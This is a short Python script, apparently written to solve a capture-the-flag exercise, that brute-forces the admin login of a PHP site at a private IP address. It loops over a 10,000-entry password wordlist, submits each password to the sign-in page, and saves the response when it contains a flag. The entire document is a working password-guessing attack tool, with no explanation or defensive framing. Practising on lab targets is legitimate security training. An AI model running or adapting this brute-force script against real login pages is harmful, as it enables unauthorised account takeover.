import requests

BASE_URL = "http://10.18.225.159/"

def main():
	crack_me()

def	crack_me():
	passwords = get_passwords_list()
	for password in passwords:
		print(f"{password}")
		response = requests.post(BASE_URL + f"index.php?page=signin&username=admin&password={password}&Login=Login#")

		if "flag" in response.text:
			yaaay_found_the_flag_lets_write_t(response.text, password)
			break


def	yaaay_found_the_flag_lets_write_t(text, password):
	print("😃 found the flag and the password")
	lines = text.split("\n")
	with open("flag.txt", "a") as f:
		f.write(text)
	for line in lines:
		if "flag" in line:
			print(f"flag = {line}\npassword = {password}")
			with open("flag.txt", "a") as f:
				f.write(line)
		
def get_passwords_list():
	passwords_list = []
	passwds_text = ""
	with open("10k.txt", "r") as f:
		passwds_text = f.read()
		passwords_list = passwds_text.split("\n")
		return passwords_list


if __name__ == "__main__":
	main()